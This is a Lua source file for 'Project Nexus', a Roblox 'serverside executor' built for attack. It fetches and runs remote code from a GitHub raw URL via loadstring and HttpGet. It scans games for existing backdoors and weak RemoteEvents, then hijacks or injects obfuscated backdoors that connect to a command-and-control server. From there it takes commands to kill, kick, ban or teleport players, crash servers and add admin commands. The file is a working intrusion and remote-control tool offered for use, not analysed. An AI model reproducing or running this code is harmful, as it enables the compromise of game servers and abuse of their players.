--[[
    ╔═══════════════════════════════════════════════╗
    ║          PROJECT NEXUS v1.0                    ║
    ║     Advanced FE Serverside Executor            ║
    ║                                                ║
    ║  Features:                                     ║
    ║  • Game vulnerability scanner                  ║
    ║  • Multi-vector backdoor injection             ║
    ║  • Serverside code execution                   ║
    ║  • Remote command & control                    ║
    ║  • Obfuscation & evasion                      ║
    ╚═══════════════════════════════════════════════╝
]]

-- Configuration
local GITHUB_REPO = "HyperCodez495/ProjectNexus-Roblox-Script"
local GITHUB_BRANCH = "main"
local GITHUB_BASE = string.format("https://raw.githubusercontent.com/%s/%s/", GITHUB_REPO, GITHUB_BRANCH)

-- Core module imports with fallback to embedded
local function loadModule(name, embedded)
    local cacheBuster = "?v=" .. tostring(tick())
    local success, module = pcall(function()
        return loadstring(game:HttpGet(GITHUB_BASE .. "core/" .. name .. ".lua" .. cacheBuster))()
    end)
    if success and module then
        return module
    else
        warn("[NEXUS] Failed to load " .. name .. " from GitHub: " .. tostring(module))
        return embedded or {}  -- Return empty table as fallback
    end
end

local Scanner = loadModule("scanner")
local Injector = loadModule("injector")
local Executor = loadModule("executor")
local Connection = loadModule("connection")

local Nexus = {}
Nexus.__index = Nexus

function Nexus.new(config)
    local self = setmetatable({}, Nexus)
    
    -- Configuration
    self.config = config or {
        commandServer = "http://localhost:8080",
        authKey = nil,
        autoScan = true,
        persistentMode = true,
        githubRepo = GITHUB_REPO,
        githubBranch = GITHUB_BRANCH
    }
    
    -- Initialize components
    self.scanner = Scanner and Scanner.new and Scanner.new() or nil
    self.injector = Injector and Injector.new and Injector.new(self.config.commandServer) or nil
    self.connection = Connection and Connection.new and Connection.new(self.config.commandServer, self.config.authKey) or nil
    self.executor = nil  -- Initialized after backdoor deployment
    
    -- State
    self.initialized = false
    self.compromised = false
    self.activeGame = nil
    
    return self
end

-- Initialize Nexus system
function Nexus:Initialize()
    print("[NEXUS] Initializing Project Nexus...")
    
    -- Connect to command server
    local connected = self.connection:Connect()
    if not connected then
        warn("[NEXUS] Failed to connect to command server")
        return false
    end
    
    print("[NEXUS] Connected to command server")
    
    -- Auto-scan current game if enabled
    if self.config.autoScan then
        self:ScanCurrentGame()
    end
    
    self.initialized = true
    print("[NEXUS] Initialization complete")
    return true
end

-- Scan current game for vulnerabilities
function Nexus:ScanCurrentGame()
    print("[NEXUS] Scanning game for vulnerabilities...")
    
    local results = self.scanner:ScanGame(game)
    self.activeGame = {
        placeId = game.PlaceId,
        jobId = game.JobId,
        scanResults = results
    }
    
    print(string.format("[NEXUS] Scan complete - Rating: %s", results.rating))
    print(string.format("  Backdoors found: %d", #results.backdoors))
    print(string.format("  Vulnerable remotes: %d", #results.remotes))
    
    return results
end

-- Attempt to compromise the game
function Nexus:Compromise(method)
    print(string.format("[NEXUS] Attempting compromise via: %s", method or "auto"))
    
    if method == "backdoor" then
        return self:ExploitExistingBackdoor()
    elseif method == "remote" then
        return self:ExploitRemoteEvents()
    elseif method == "inject" then
        return self:InjectNewBackdoor()
    else
        -- Auto-select best method based on scan
        if self.activeGame and self.activeGame.scanResults then
            local results = self.activeGame.scanResults
            if #results.backdoors > 0 then
                return self:ExploitExistingBackdoor()
            elseif #results.remotes > 0 then
                return self:ExploitRemoteEvents()
            end
        end
    end
    
    return false
end

-- Exploit existing backdoor
function Nexus:ExploitExistingBackdoor()
    if not self.activeGame or not self.activeGame.scanResults then
        return false
    end
    
    local backdoors = self.activeGame.scanResults.backdoors
    if #backdoors == 0 then
        print("[NEXUS] No existing backdoors found")
        return false
    end
    
    print(string.format("[NEXUS] Found %d existing backdoors, attempting exploitation...", #backdoors))
    
    -- Try each backdoor
    for _, backdoor in ipairs(backdoors) do
        local success = self:HijackBackdoor(backdoor)
        if success then
            print("[NEXUS] Successfully hijacked backdoor: " .. backdoor.script)
            self.compromised = true
            self:InitializeExecutor()
            return true
        end
    end
    
    print("[NEXUS] Failed to exploit existing backdoors")
    return false
end

-- Hijack an existing backdoor
function Nexus:HijackBackdoor(backdoorInfo)
    -- Attempt to modify or redirect the backdoor
    local targetScript = game:GetDescendants()
    for _, obj in ipairs(targetScript) do
        if obj:GetFullName() == backdoorInfo.script then
            -- Inject connection to our command server
            local success, err = pcall(function()
                local injectionCode = self.injector:CreateObfuscatedBackdoor(self.config.commandServer)
                obj.Source = obj.Source .. "\n" .. injectionCode
            end)
            return success
        end
    end
    return false
end

-- Exploit vulnerable RemoteEvents
function Nexus:ExploitRemoteEvents()
    if not self.activeGame or not self.activeGame.scanResults then
        return false
    end
    
    local remotes = self.activeGame.scanResults.remotes
    if #remotes == 0 then
        print("[NEXUS] No vulnerable remotes found")
        return false
    end
    
    print(string.format("[NEXUS] Found %d remotes, attempting exploitation...", #remotes))
    
    -- Try to find or create an exploitable remote
    for _, remote in ipairs(remotes) do
        local success = self:ExploitRemote(remote)
        if success then
            print("[NEXUS] Successfully exploited remote: " .. remote.remote)
            self.compromised = true
            self:InitializeExecutor()
            return true
        end
    end
    
    return false
end

-- Exploit specific remote
function Nexus:ExploitRemote(remoteInfo)
    -- Attempt to fire remote with command payload
    local remotePath = remoteInfo.remote
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:GetFullName() == remotePath and obj:IsA("RemoteEvent") then
            local success = pcall(function()
                obj:FireServer("exec", self.injector:CreateObfuscatedBackdoor(self.config.commandServer))
            end)
            return success
        end
    end
    return false
end

-- Inject new backdoor
function Nexus:InjectNewBackdoor(location)
    print("[NEXUS] Injecting new backdoor...")
    
    local target = location or game:GetService("ReplicatedStorage")
    local backdoorCode = self.injector:CreateObfuscatedBackdoor(self.config.commandServer)
    
    local success, script = self.injector:Deploy(backdoorCode, target, "CoreModule")
    
    if success then
        print("[NEXUS] Backdoor deployed successfully")
        self.compromised = true
        self:InitializeExecutor()
        return true
    end
    
    print("[NEXUS] Backdoor injection failed")
    return false
end

-- Initialize executor after compromise
function Nexus:InitializeExecutor()
    self.executor = Executor.new(self.connection)
    
    -- Start command polling
    self.connection:StartPolling(function(command)
        self:HandleCommand(command)
    end)
    
    -- Start heartbeat
    self.connection:StartHeartbeat()
    
    print("[NEXUS] Executor initialized and listening for commands")
end

-- Handle incoming commands
function Nexus:HandleCommand(command)
    if not self.executor then
        return
    end
    
    print(string.format("[NEXUS] Executing command: %s", command.type))
    
    local success, result
    
    if command.type == "execute" then
        success, result = self.executor:Execute(command.code)
    elseif command.type == "kill" then
        success, result = self.executor:KillPlayer(command.target)
    elseif command.type == "teleport" then
        success, result = self.executor:TeleportPlayer(command.target, command.position)
    elseif command.type == "crash" then
        success, result = self.executor:CrashServer(command.method)
    elseif command.type == "admin" then
        success, result = self.executor:InjectAdminCommands()
    end
    
    -- Send result back
    self.connection:SendResult(command.id, success, result)
end

-- Execute custom code
function Nexus:Execute(code)
    if not self.compromised or not self.executor then
        warn("[NEXUS] System not compromised - cannot execute")
        return false
    end
    
    return self.executor:Execute(code)
end

-- Quick command interface
function Nexus:Command(cmd, ...)
    if not self.executor then
        return false, "Not initialized"
    end
    
    local commands = {
        kill = function(target) return self.executor:KillPlayer(target) end,
        tp = function(target, pos) return self.executor:TeleportPlayer(target, pos) end,
        kick = function(target, reason) return self.executor:KickPlayer(target, reason) end,
        ban = function(target) return self.executor:BanPlayer(target) end,
        crash = function(method) return self.executor:CrashServer(method) end,
        admin = function() return self.executor:InjectAdminCommands() end,
    }
    
    if commands[cmd] then
        return commands[cmd](...)
    else
        return false, "Unknown command"
    end
end

-- Get system status
function Nexus:GetStatus()
    return {
        initialized = self.initialized,
        compromised = self.compromised,
        connected = self.connection:GetStatus().connected,
        game = self.activeGame,
        executor = self.executor ~= nil
    }
end

-- Shutdown and cleanup
function Nexus:Shutdown()
    print("[NEXUS] Shutting down...")
    
    if self.executor then
        self.executor:EndSession()
    end
    
    self.connection:Disconnect()
    self.injector:CleanupBackdoors()
    
    print("[NEXUS] Shutdown complete")
end

-- Export global interface
_G.Nexus = Nexus

-- Auto-initialize if configured
if getgenv and getgenv().NexusAutoInit then
    local instance = Nexus.new()
    instance:Initialize()
    _G.NexusInstance = instance
    print("[NEXUS] Auto-initialized - Access via _G.NexusInstance")
end

return Nexus
